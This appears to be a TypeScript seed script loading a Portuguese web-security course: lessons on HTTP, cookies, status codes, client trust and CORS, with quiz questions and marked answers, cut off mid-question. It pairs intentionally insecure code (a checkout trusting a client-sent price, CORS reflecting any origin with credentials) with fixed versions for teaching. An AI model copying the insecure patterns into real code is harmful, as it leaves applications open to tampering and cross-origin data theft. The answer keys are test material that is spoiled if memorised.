// Seed da trilha Segurança de Aplicações Web / AppSec (intermediário), ancorada no
// OWASP Top 10 2025. Idempotente e não destrutivo: se a trilha já tiver aulas, não faz nada.
//
// Rodar em prod: docker compose -f docker-compose.prod.yml exec -T backend node scripts/seed-trilha-appsec.ts
import { db } from "../db.ts";
import { trails, modules, lessons, questions, questionOptions } from "../schema.ts";
import { eq } from "drizzle-orm";

const NOME = "Segurança de Aplicações Web";
const DESCRICAO =
    "Trilha intermediária de segurança de aplicações web (AppSec) para quem desenvolve: como as vulnerabilidades do OWASP Top 10 2025 funcionam e como se defender, com exemplos de código inseguro e seguro lado a lado. Cobre controle de acesso, injeção e XSS, autenticação, criptografia, configuração e cadeia de suprimentos, design seguro, integridade e o ciclo de desenvolvimento seguro.";

type Bloco = { type: "text" | "code" | "quote" | "table"; value: string };
type Questao = {
    statement: string;
    difficulty: "facil" | "medio" | "dificil";
    options: { text: string; isCorrect: boolean }[];
};
type Aula = { titulo: string; blocks: Bloco[]; questions: Questao[] };
type Modulo = { titulo: string; aulas: Aula[] };

const MODULOS: Modulo[] = [
    {
        "titulo": "Módulo 1 - Fundamentos de segurança web",
        "aulas": [
            {
                "titulo": "A conversa entre cliente e servidor: HTTP na prática",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# A conversa entre cliente e servidor: HTTP na prática\n\nBem-vindo à trilha de Segurança de Aplicações Web. Antes de aprender a **defender** uma aplicação, você precisa enxergar como ela funciona por baixo do capô. E a boa notícia é: quase tudo na web acontece por meio de um protocolo só, o **HTTP**.\n\nPor que começar por aqui? Porque **todo ataque a uma aplicação web é, no fundo, uma requisição HTTP cuidadosamente montada**. O atacante não clica em botões bonitinhos: ele fala HTTP diretamente com o seu servidor. Se você entende essa conversa, você entende onde mora o perigo.\n\n## O ciclo requisição-resposta\n\nA web funciona em ciclos simples: o **cliente** (em geral o navegador) envia uma **requisição** e o **servidor** devolve uma **resposta**. Só isso, repetido milhares de vezes. Duas características importam para segurança:\n\n- O HTTP é **baseado em texto**: uma requisição é literalmente um punhado de linhas de texto. Isso significa que ela pode ser lida, copiada e **forjada** à mão.\n- O HTTP é **sem estado** (stateless): cada requisição é independente e o servidor, por si só, não lembra da anterior. Guardar quem está logado exige um truque extra (cookies e sessões), tema da próxima aula."
                    },
                    {
                        "type": "code",
                        "value": "GET /produtos/42 HTTP/1.1          <- linha de requisicao: metodo, caminho, versao\nHost: loja.exemplo.com             <- para qual site e o pedido\nUser-Agent: Mozilla/5.0            <- qual navegador/cliente esta pedindo\nAccept: application/json           <- que formato de resposta eu aceito\nCookie: sessao=a1b2c3              <- quem sou eu (credencial da sessao)\n                                   <- linha em branco: fim dos cabecalhos\n(uma requisicao GET normalmente nao tem corpo)"
                    },
                    {
                        "type": "text",
                        "value": "## Dissecando a requisição\n\nToda requisição HTTP tem a mesma estrutura, de cima para baixo:\n\n1. **Linha de requisição**: o **método** (GET), o **caminho** do recurso (/produtos/42) e a **versão** do protocolo (HTTP/1.1).\n2. **Cabeçalhos** (headers): pares `Nome: valor` com metadados sobre o pedido, como `Host`, `Accept` e `Cookie`.\n3. **Linha em branco**: separa os cabeçalhos do corpo.\n4. **Corpo** (body): os dados enviados. GET normalmente não tem corpo; POST e PUT costumam ter (um JSON, um formulário etc.).\n\n## Os métodos HTTP\n\nO **método** (ou verbo) declara a **intenção** do pedido. Ele é uma convenção: nada impede tecnicamente um servidor mal escrito de apagar dados num GET, mas isso seria uma péssima (e perigosa) ideia. Os principais:"
                    },
                    {
                        "type": "table",
                        "value": "[[\"Método\", \"Intenção\", \"Costuma ter corpo?\", \"Idempotente?\"], [\"GET\", \"Ler/buscar um recurso, sem alterar nada\", \"Não\", \"Sim\"], [\"POST\", \"Criar um recurso ou disparar uma ação\", \"Sim\", \"Não\"], [\"PUT\", \"Substituir um recurso por inteiro\", \"Sim\", \"Sim\"], [\"PATCH\", \"Alterar parte de um recurso\", \"Sim\", \"Não\"], [\"DELETE\", \"Remover um recurso\", \"Às vezes\", \"Sim\"]]"
                    },
                    {
                        "type": "code",
                        "value": "HTTP/1.1 200 OK                       <- versao, codigo de status e frase\nContent-Type: application/json        <- formato do corpo da resposta\nSet-Cookie: sessao=a1b2c3; HttpOnly   <- servidor pede para o navegador guardar um cookie\nCache-Control: no-store               <- nao guardar em cache (dado sensivel)\n                                      <- linha em branco separa cabecalhos do corpo\n{\"id\":42,\"nome\":\"Teclado\",\"preco\":150.0}   <- corpo: os dados pedidos"
                    },
                    {
                        "type": "text",
                        "value": "## A resposta, linha por linha\n\nA resposta espelha a requisição: começa com a **linha de status** (versão + **código de status** + frase, como `200 OK`), traz seus próprios **cabeçalhos** (aqui o servidor manda guardar um cookie e desliga o cache) e, depois da linha em branco, o **corpo** com os dados.\n\n## Segurança começa aqui\n\nRepare numa consequência incômoda: como a requisição é só texto, **o navegador é opcional**. Um atacante pode montar exatamente a mesma requisição com uma ferramenta de linha de comando (`curl`), um cliente de API (Postman) ou um **proxy de interceptação** (como o Burp Suite ou o OWASP ZAP) que edita a requisição no meio do caminho.\n\nOu seja: aquele campo que o seu formulário limita a 10 caracteres, aquele botão que só aparece para o admin, aquele preço fixado na tela, nada disso protege o servidor. O atacante fala HTTP direto. Guarde esta frase, que é a base de toda a trilha: **o servidor precisa se defender sozinho, sem contar com a boa vontade do cliente**."
                    }
                ],
                "questions": [
                    {
                        "statement": "O protocolo HTTP funciona em ciclos de requisição e resposta. O que caracteriza esse modelo?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "O cliente envia o pedido e o servidor responde; o HTTP não guarda memória entre um pedido e outro.",
                                "isCorrect": true
                            },
                            {
                                "text": "O servidor inicia o contato e manda dados antes de qualquer pedido do cliente.",
                                "isCorrect": false
                            },
                            {
                                "text": "Cliente e servidor abrem uma conexão só e a mantêm aberta o tempo todo, sem mensagens separadas.",
                                "isCorrect": false
                            },
                            {
                                "text": "O navegador responde e o servidor pergunta, invertendo os papéis de uma troca comum.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Em uma API, qual método HTTP é normalmente usado apenas para buscar/ler dados, sem a intenção de modificar o estado do servidor?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "DELETE",
                                "isCorrect": false
                            },
                            {
                                "text": "GET",
                                "isCorrect": true
                            },
                            {
                                "text": "POST",
                                "isCorrect": false
                            },
                            {
                                "text": "PUT",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Considere a requisição a seguir:\n\nPOST /transferencias HTTP/1.1\nHost: banco.exemplo.com\nContent-Type: application/json\n\n{\"para\":\"conta-999\",\"valor\":5000}\n\nQual afirmação está correta?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "É uma requisição POST que carrega os dados da transferência no corpo, em JSON.",
                                "isCorrect": true
                            },
                            {
                                "text": "É uma requisição GET que carrega os dados da transferência na própria URL.",
                                "isCorrect": false
                            },
                            {
                                "text": "É uma requisição POST em que o valor 5000 fica gravado no cabeçalho Host.",
                                "isCorrect": false
                            },
                            {
                                "text": "É uma requisição POST sem corpo; os dados ficam só na linha inicial do pedido.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma operação de \"apagar o produto 42\" será exposta em uma API. Pelas convenções do HTTP, qual método é o mais adequado e por quê?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "DELETE, pois expressa a intenção de remover o recurso e é idempotente.",
                                "isCorrect": true
                            },
                            {
                                "text": "GET, pois é o método mais rápido e serve para qualquer tipo de operação.",
                                "isCorrect": false
                            },
                            {
                                "text": "POST, pois é o único verbo HTTP que tem permissão para alterar dados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Tanto faz o verbo escolhido; o método HTTP não influencia a operação feita.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um desenvolvedor afirma: \"minha API só pode ser chamada pela minha página, porque só o meu site tem os botões que disparam as requisições\". Por que esse raciocínio é perigoso?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Porque qualquer um pode montar a mesma requisição com curl, Postman ou um proxy, sem usar a página.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque botões antigos costumam quebrar em navegadores desatualizados, sem suporte a scripts modernos.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o protocolo HTTP só aceita requisições originadas de um formulário HTML válido e completo.",
                                "isCorrect": false
                            },
                            {
                                "text": "Está correto, pois sem o JavaScript do site nenhuma ferramenta externa consegue acessar a API.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Cabeçalhos, cookies e status codes",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Cabeçalhos, cookies e status codes\n\nNa aula anterior vimos que o HTTP é **sem estado**: o servidor não lembra, sozinho, de uma requisição para outra. Então como um site sabe que você já fez login e continua logado enquanto navega? A resposta está em três peças que vamos destrinchar agora: **cabeçalhos**, **cookies/sessões** e **status codes**. As três são também terreno fértil para ataques.\n\n## Cabeçalhos (headers)\n\nCabeçalhos são pares `Nome: valor` que acompanham requisições e respostas carregando **metadados**: quem está pedindo, em que formato, com qual credencial, o que fazer com o cache, e por aí vai. Alguns são enviados pelo cliente, outros pelo servidor. Vários têm papel direto em segurança."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Cabeçalho\", \"Direção\", \"Para que serve\"], [\"Host\", \"Requisição\", \"Diz para qual site (domínio) é o pedido\"], [\"Authorization\", \"Requisição\", \"Envia uma credencial, como um token de acesso\"], [\"Cookie\", \"Requisição\", \"Reenvia os cookies guardados (inclui a sessão)\"], [\"Content-Type\", \"Ambos\", \"Informa o formato do corpo (JSON, formulário...)\"], [\"Set-Cookie\", \"Resposta\", \"Pede ao navegador para guardar um cookie\"], [\"Location\", \"Resposta\", \"Indica para onde redirecionar (usado com 3xx)\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Cookies: a memória entre requisições\n\nUm **cookie** é um pedacinho de texto que o servidor manda o navegador guardar (via `Set-Cookie`) e que o navegador **reenvia automaticamente** em toda requisição seguinte para aquele site (no cabeçalho `Cookie`). É assim que o site te reconhece sem pedir login a cada clique.\n\n## Sessões\n\nO uso mais comum de cookie é a **sessão**. No login, o servidor cria uma sessão do seu lado (na memória ou no banco), gera um **identificador opaco e aleatório** e o envia num cookie. Nas próximas requisições, o navegador manda esse id de volta, e o servidor descobre quem você é. O cookie **não** guarda a sua senha nem os seus dados: guarda só uma chave que aponta para a sessão no servidor.\n\n## Blindando o cookie de sessão\n\nComo esse cookie é praticamente a sua identidade, protegê-lo é essencial. Três atributos ajudam:\n\n- **HttpOnly**: o cookie fica invisível para o JavaScript da página (`document.cookie` não o lê). Isso dificulta o roubo por scripts maliciosos.\n- **Secure**: o navegador só envia o cookie por **HTTPS**, nunca por HTTP em texto puro.\n- **SameSite**: controla se o cookie é enviado em requisições vindas de **outros sites** (mitiga CSRF). Com `Strict` ou `Lax`, o cookie não viaja em navegações cross-site indevidas."
                    },
                    {
                        "type": "code",
                        "value": "Resposta do login (o servidor cria a sessao e pede para guardar o cookie):\n\nHTTP/1.1 200 OK\nSet-Cookie: sessao=9f8e7d; HttpOnly; Secure; SameSite=Strict\n\nNa proxima requisicao, o navegador reenvia o cookie sozinho:\n\nGET /minha-conta HTTP/1.1\nHost: app.exemplo.com\nCookie: sessao=9f8e7d"
                    },
                    {
                        "type": "text",
                        "value": "## Status codes\n\nToda resposta traz um **código de status** de três dígitos que resume o que aconteceu. Eles se organizam em famílias pelo primeiro dígito:\n\n- **2xx (sucesso)**: deu certo. Ex.: `200 OK`, `201 Created`.\n- **3xx (redirecionamento)**: procure em outro lugar. Ex.: `301`, `302` (com o cabeçalho `Location`).\n- **4xx (erro do cliente)**: o pedido está errado. Ex.: `400`, `401`, `403`, `404`, `429 Too Many Requests`.\n- **5xx (erro do servidor)**: o servidor falhou. Ex.: `500 Internal Server Error`.\n\nDois detalhes importam para segurança. Primeiro, **401 e 403 são diferentes**: `401 Unauthorized` significa \"você não está autenticado\" (falta login), enquanto `403 Forbidden` significa \"você está autenticado, mas não pode fazer isso\". Segundo, **mensagens de erro que falam demais** viram informação para o atacante: respostas diferentes para \"usuário não existe\" e \"senha incorreta\" permitem descobrir quais contas existem."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Código\", \"Família\", \"Significado\"], [\"200 OK\", \"2xx sucesso\", \"Deu tudo certo\"], [\"301/302\", \"3xx redirecionamento\", \"O recurso está em outro endereço\"], [\"400\", \"4xx erro do cliente\", \"Requisição malformada\"], [\"401\", \"4xx erro do cliente\", \"Falta autenticação (quem é você?)\"], [\"403\", \"4xx erro do cliente\", \"Autenticado, mas sem permissão\"], [\"404\", \"4xx erro do cliente\", \"Recurso não encontrado\"], [\"500\", \"5xx erro do servidor\", \"Falha inesperada no servidor\"]]"
                    }
                ],
                "questions": [
                    {
                        "statement": "O HTTP é sem estado. Como um servidor \"lembra\" que você já fez login entre uma requisição e outra?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Ele cria um cookie de sessão no login, que o navegador reenvia sozinho a cada requisição.",
                                "isCorrect": true
                            },
                            {
                                "text": "O navegador guarda a senha digitada no login e a reenvia sozinho a cada requisição nova.",
                                "isCorrect": false
                            },
                            {
                                "text": "O servidor identifica você apenas pelo seu endereço IP de rede e confia nele indefinidamente.",
                                "isCorrect": false
                            },
                            {
                                "text": "O próprio HTML memoriza a senha do usuário e a reenvia sozinho a cada clique na página.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para que serve o atributo HttpOnly em um cookie?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Impede que o JavaScript da página leia o cookie via document.cookie, dificultando o roubo.",
                                "isCorrect": true
                            },
                            {
                                "text": "Faz o cookie trafegar somente por conexões HTTP em texto puro, nunca por HTTPS seguro.",
                                "isCorrect": false
                            },
                            {
                                "text": "Criptografa o conteúdo do cookie antes de armazená-lo localmente no navegador do usuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Faz o cookie expirar automaticamente assim que a aba do navegador for fechada pelo usuário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um usuário autenticado tenta acessar um recurso ao qual não tem permissão. Qual status code representa melhor \"você está identificado, mas não pode fazer isso\"?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "403 Forbidden",
                                "isCorrect": true
                            },
                            {
                                "text": "401 Unauthorized",
                                "isCorrect": false
                            },
                            {
                                "text": "404 Not Found",
                                "isCorrect": false
                            },
                            {
                                "text": "200 OK",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Analise o cabeçalho a seguir:\n\nSet-Cookie: sessao=xyz; HttpOnly; Secure; SameSite=Strict\n\nO que o atributo Secure garante?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Que o navegador só envia esse cookie por HTTPS, nunca por HTTP puro.",
                                "isCorrect": true
                            },
                            {
                                "text": "Que o cookie fica inacessível ao JavaScript da página, como o HttpOnly.",
                                "isCorrect": false
                            },
                            {
                                "text": "Que o cookie nunca expira, permanecendo salvo para sempre no navegador.",
                                "isCorrect": false
                            },
                            {
                                "text": "Que o cookie passa a ser enviado para qualquer site, de forma criptografada.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma tela de login responde \"usuário não existe\" quando o e-mail não está cadastrado e \"senha incorreta\" quando a senha erra. Por que isso é um problema de segurança?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "As respostas diferentes revelam quais e-mails existem (enumeração); o certo é uma mensagem genérica.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum problema: mensagens específicas só ajudam o usuário e não afetam a segurança do sistema.",
                                "isCorrect": false
                            },
                            {
                                "text": "O erro está no código 401 usado; o certo seria responder sempre com 200 em qualquer caso.",
                                "isCorrect": false
                            },
                            {
                                "text": "O erro é exibir qualquer texto; nenhum status code deveria vir acompanhado de mensagem.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "A fronteira de confiança: nunca confie no cliente",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# A fronteira de confiança: nunca confie no cliente\n\nChegamos ao princípio mais importante de toda a segurança de aplicações. Se você guardar uma única ideia desta trilha, guarde esta.\n\n## Onde termina o que é seu\n\nToda aplicação web tem uma **fronteira de confiança**: uma linha imaginária que separa o que está **sob o seu controle** do que está **sob o controle do usuário** (e, portanto, de um possível atacante).\n\n- **Lado NÃO confiável (o cliente)**: o navegador, o HTML, o CSS, o JavaScript que você mandou para a página, os campos do formulário, os cookies e cada requisição que chega. Tudo isso roda na máquina do usuário e pode ser lido, alterado e recriado por ele.\n- **Lado confiável (o servidor)**: o seu código de servidor, o banco de dados, as variáveis de ambiente. É o único território onde você manda de verdade.\n\nTudo que **cruza** essa fronteira em direção ao servidor é **entrada não confiável**, sem exceção."
                    },
                    {
                        "type": "quote",
                        "value": "Nunca confie na entrada do usuário. Tudo que vem do cliente, parâmetros de URL, campos de formulário, cabeçalhos, cookies e corpo da requisição, pode ser forjado. A validação e a autorização de verdade acontecem sempre no **servidor**."
                    },
                    {
                        "type": "text",
                        "value": "## Tudo que vem do navegador pode ser forjado\n\nÉ tentador achar que, se a sua página não oferece um jeito de fazer algo, então ninguém consegue fazer. Errado. Lembre da aula 1: o atacante fala HTTP direto. Ele pode manipular, entre outros:\n\n- **Parâmetros de URL**: trocar `?id=1001` por `?id=1002`.\n- **Campos de formulário, inclusive `hidden`**: um campo escondido não é um campo protegido; é só invisível na tela.\n- **Cabeçalhos e cookies**: qualquer valor pode ser alterado antes do envio.\n- **Corpo da requisição**: adicionar, remover ou mudar campos do JSON.\n- **Validações do front-end**: aquele `required` e aquele `maxlength` do HTML são conforto para o usuário honesto, não uma barreira.\n\nAs ferramentas para isso são triviais: o **DevTools** do próprio navegador, o `curl`, um cliente de API ou um proxy que intercepta e edita a requisição. Nenhuma delas é sofisticada."
                    },
                    {
                        "type": "code",
                        "value": "// Front-end: monta o pedido de checkout\n// (qualquer um pode abrir o DevTools e trocar o valor de 'preco')\nconst preco = document.querySelector('#preco').value;\nfetch('/checkout', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ produtoId: 42, preco: preco, qtd: 1 })\n});\n\n// Back-end (Node/Express): CONFIA no preco que veio do cliente\napp.post('/checkout', (req, res) => {\n  const { produtoId, preco, qtd } = req.body;\n  const total = preco * qtd;        // <- preco veio do navegador!\n  cobrar(req.user, total);          // e se o atacante enviar preco = 0?\n  res.json({ ok: true, total });\n});"
                    },
                    {
                        "type": "code",
                        "value": "// Back-end: o preco e a fonte da verdade no SERVIDOR, nunca no cliente\napp.post('/checkout', async (req, res) => {\n  const { produtoId, qtd } = req.body;      // ignora qualquer 'preco' do cliente\n\n  if (!Number.isInteger(qtd) || qtd < 1 || qtd > 10) {\n    return res.status(400).json({ erro: 'Quantidade invalida' });\n  }\n\n  const produto = await db.produtos.buscarPorId(produtoId);\n  if (!produto) return res.status(404).json({ erro: 'Produto nao encontrado' });\n\n  const total = produto.preco * qtd;        // <- preco lido do banco de dados\n  await cobrar(req.user, total);\n  res.json({ ok: true, total });\n});"
                    },
                    {
                        "type": "text",
                        "value": "## O que \"validar no servidor\" significa na prática\n\nCorrigir não é \"validar mais no front\". É assumir que o cliente pode mentir e, no servidor:\n\n- **Recalcular o que é sensível** a partir de fontes confiáveis. O preço vem do banco, não do JSON; o total é calculado no servidor.\n- **Validar toda entrada** contra regras explícitas: tipo, faixa, tamanho, formato. Prefira **listas de permissão** (o que é aceito) a listas de bloqueio (o que é proibido).\n- **Verificar autorização no servidor**, sempre. Esconder um botão no front não impede ninguém de chamar o endpoint por trás dele.\n- **Nunca deduzir identidade ou permissão de dados enviados pelo cliente**, como um campo `isAdmin: true` no corpo. Isso o servidor decide a partir da sessão.\n\nO front-end continua validando, claro, mas por **experiência do usuário** (dar feedback rápido), nunca como defesa. A defesa real mora do lado de cá da fronteira."
                    }
                ],
                "questions": [
                    {
                        "statement": "No modelo de confiança de uma aplicação web, o que fica do lado NÃO confiável?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Tudo que roda no navegador: HTML, JavaScript, campos de formulário, cookies e a requisição enviada.",
                                "isCorrect": true
                            },
                            {
                                "text": "O banco de dados usado pelo servidor para guardar as informações internas da aplicação inteira.",
                                "isCorrect": false
                            },
                            {
                                "text": "O código-fonte que roda apenas no servidor, fora do alcance direto de qualquer usuário externo.",
                                "isCorrect": false
                            },
                            {
                                "text": "As variáveis de ambiente configuradas apenas no servidor de produção da aplicação inteira.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual é o princípio central da segurança de aplicações web abordado nesta aula?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Nunca confie na entrada do cliente: toda validação de verdade acontece no servidor.",
                                "isCorrect": true
                            },
                            {
                                "text": "Pode confiar no cliente, desde que toda a conexão use HTTPS de ponta a ponta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Validar os dados apenas no front-end já é o suficiente para o sistema ficar seguro.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um campo do tipo hidden nunca pode ser alterado pelo usuário, de jeito nenhum.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "No trecho de checkout em que o back-end faz `const total = preco * qtd;` usando o `preco` recebido do cliente, qual é a falha?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "O total usa o preço vindo do cliente, que um atacante pode alterar antes de enviar a requisição.",
                                "isCorrect": true
                            },
                            {
                                "text": "Falta validar corretamente o formato do e-mail informado pelo usuário no formulário de compra.",
                                "isCorrect": false
                            },
                            {
                                "text": "Falta um bloco try/catch para tratar os possíveis erros de rede durante todo o checkout.",
                                "isCorrect": false
                            },
                            {
                                "text": "O erro real está em usar o verbo POST em vez de GET nessa rota de checkout da API.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Como corrigir corretamente o checkout que confia no preço do cliente?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Ignorar o preço enviado pelo cliente e recalcular o total com o preço salvo no banco.",
                                "isCorrect": true
                            },
                            {
                                "text": "Trocar o campo de preço para o tipo hidden dentro do próprio formulário de checkout.",
                                "isCorrect": false
                            },
                            {
                                "text": "Reforçar ainda mais a validação do preço em JavaScript antes de enviar a requisição.",
                                "isCorrect": false
                            },
                            {
                                "text": "Criptografar o valor do preço já no cliente, antes de enviar a requisição inteira.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um sistema esconde o botão \"Excluir usuário\" via CSS para quem não é admin, mas o endpoint DELETE /usuarios/:id não checa permissão no servidor. Por que isso é inseguro?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Esconder o botão só muda a tela; qualquer um pode chamar o DELETE direto, sem passar pela interface.",
                                "isCorrect": true
                            },
                            {
                                "text": "Não é inseguro: um botão escondido torna a ação indisponível para qualquer usuário comum.",
                                "isCorrect": false
                            },
                            {
                                "text": "O risco só desaparece de verdade se o botão for totalmente removido do HTML em vez de escondido por CSS.",
                                "isCorrect": false
                            },
                            {
                                "text": "Basta checar direito a permissão em JavaScript antes de exibir o botão na tela do sistema.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Mesma origem: Same-Origin Policy e CORS",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Mesma origem: Same-Origin Policy e CORS\n\nO seu navegador é um lugar movimentado: ao mesmo tempo, ele pode ter aberta a aba do seu banco, a do seu e-mail e a de um site qualquer que você acabou de visitar. Cada um desses sites traz o seu próprio JavaScript. O que impede o JavaScript daquele site aleatório de simplesmente ler a sua caixa de entrada ou a sua conta bancária na aba ao lado?\n\nA resposta é uma regra de segurança fundamental do navegador: a **Same-Origin Policy** (Política de Mesma Origem). Para entendê-la, primeiro precisamos definir o que é uma **origem**."
                    },
                    {
                        "type": "text",
                        "value": "## O que é uma origem\n\nUma **origem** é a combinação de **três** partes de uma URL:\n\n- **Esquema**: `http` ou `https`.\n- **Host**: o domínio, como `loja.com` (subdomínios contam: `api.loja.com` é outro host).\n- **Porta**: `443`, `80`, `8443`...\n\nDuas URLs são da **mesma origem** apenas se as três partes forem idênticas. Basta uma diferir para serem origens diferentes. Repare que o **caminho** (`/produtos`) e os **parâmetros** (`?id=1`) não entram na conta."
                    },
                    {
                        "type": "table",
                        "value": "[[\"URL de referência\", \"Outra URL\", \"Mesma origem?\", \"Motivo\"], [\"https://site.com/a\", \"https://site.com/b\", \"Sim\", \"Esquema, host e porta iguais (o caminho não conta)\"], [\"https://site.com\", \"http://site.com\", \"Não\", \"Esquema diferente (https x http)\"], [\"https://site.com\", \"https://api.site.com\", \"Não\", \"Host diferente (o subdomínio conta)\"], [\"https://site.com\", \"https://site.com:8443\", \"Não\", \"Porta diferente\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## A Same-Origin Policy\n\nA regra é: o JavaScript de uma origem **não pode ler** dados de outra origem. Graças a ela, o script de `site-qualquer.com` não consegue ler a resposta da sua aba de `banco.com`, nem acessar os cookies ou o conteúdo (o DOM) de outra origem.\n\nMas atenção a um ponto que confunde muita gente: a Same-Origin Policy restringe **ler a resposta**, e não necessariamente **enviar a requisição**. O navegador pode até disparar uma requisição para outra origem (e ela chegar ao servidor, carregando os seus cookies), só que o JavaScript é impedido de ler o que voltou. É justamente essa brecha que abre espaço para ataques como o CSRF, que veremos mais adiante na trilha."
                    },
                    {
                        "type": "text",
                        "value": "## CORS: relaxando a regra com controle\n\nE quando você **precisa** que origens diferentes conversem? O caso clássico: o seu front-end em `https://app.exemplo.com` consumindo a sua API em `https://api.exemplo.com`. Como são hosts diferentes, são origens diferentes, e a Same-Origin Policy bloquearia a leitura da resposta.\n\nA solução é o **CORS** (Cross-Origin Resource Sharing). Com ele, é o **servidor** que decide, por meio de cabeçalhos de resposta, quais origens têm permissão para acessar seus recursos. O principal é o `Access-Control-Allow-Origin`. Para requisições mais sensíveis, o navegador faz antes uma pequena requisição de verificação (o **preflight**, um `OPTIONS`) para perguntar ao servidor se aquela chamada é permitida.\n\nO ponto-chave: CORS **não é** uma forma de \"burlar\" segurança nem de proteger o servidor. É um mecanismo para o servidor **autorizar explicitamente** exceções à mesma origem, de forma controlada."
                    },
                    {
                        "type": "code",
                        "value": "// INSEGURO: reflete QUALQUER origem e ainda libera credenciais\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', req.headers.origin);  // <- eco de qualquer site\n  res.header('Access-Control-Allow-Credentials', 'true');         // <- junto com cookies!\n  next();\n});\n\n// SEGURO: apenas origens conhecidas entram na lista\nconst origensPermitidas = ['https://app.exemplo.com', 'https://admin.exemplo.com'];\napp.use((req, res, next) => {\n  const origem = req.headers.origin;\n  if (origensPermitidas.includes(origem)) {\n    res.header('Access-Control-Allow-Origin', origem);\n    res.header('Access-Control-Allow-Credentials', 'true');\n  }\n  next();\n});"
                    }
                ],
                "questions": [
                    {
                        "statement": "Uma \"origem\", no navegador, é definida pela combinação de quais três partes da URL?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Esquema (http/https), host (domínio) e porta.",
                                "isCorrect": true
                            },
                            {
                                "text": "Domínio, caminho e parâmetros de consulta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas o domínio.",
                                "isCorrect": false
                            },
                            {
                                "text": "Usuário, senha e domínio.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual é o objetivo principal da Same-Origin Policy (Política de Mesma Origem)?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Impedir que uma página leia livremente dados de outra origem, como o conteúdo de outra aba logada.",
                                "isCorrect": true
                            },
                            {
                                "text": "Criptografar todo o tráfego trocado entre o navegador do usuário e o respectivo servidor de destino.",
                                "isCorrect": false
                            },
                            {
                                "text": "Impedir que o servidor registre logs detalhados de cada acesso recebido na aplicação.",
                                "isCorrect": false
                            },
                            {
                                "text": "Bloquear o carregamento de imagens hospedadas em sites de outras origens diferentes.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "A página em https://loja.com faz uma requisição para https://api.loja.com. Do ponto de vista da mesma origem, o que acontece?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "São origens diferentes, pois o host muda; o CORS decide se o JavaScript lê a resposta.",
                                "isCorrect": true
                            },
                            {
                                "text": "São a mesma origem, já que loja.com e api.loja.com compartilham o domínio-raiz.",
                                "isCorrect": false
                            },
                            {
                                "text": "É bloqueada por completo: navegadores nunca permitem chamadas entre subdomínios.",
                                "isCorrect": false
                            },
                            {
                                "text": "É a mesma origem, porque as duas URLs usam exatamente o mesmo esquema https, seguro.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para que serve o CORS (Cross-Origin Resource Sharing)?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Permite que o servidor autorize origens específicas a acessar seus recursos, com controle.",
                                "isCorrect": true
                            },
                            {
                                "text": "Serve para desligar a Same-Origin Policy por completo em todo o navegador do usuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "É um firewall embutido no navegador que bloqueia toda requisição maliciosa recebida.",
                                "isCorrect": false
                            },
                            {
                                "text": "É um cabeçalho HTTP que criptografa todo o corpo da resposta enviada pelo servidor.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um back-end responde com Access-Control-Allow-Origin refletindo qualquer origem recebida e Access-Control-Allow-Credentials: true. Por que essa configuração é perigosa?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Qualquer site pode usar os cookies da vítima e ler a resposta; o certo é liberar só origens confiáveis.",
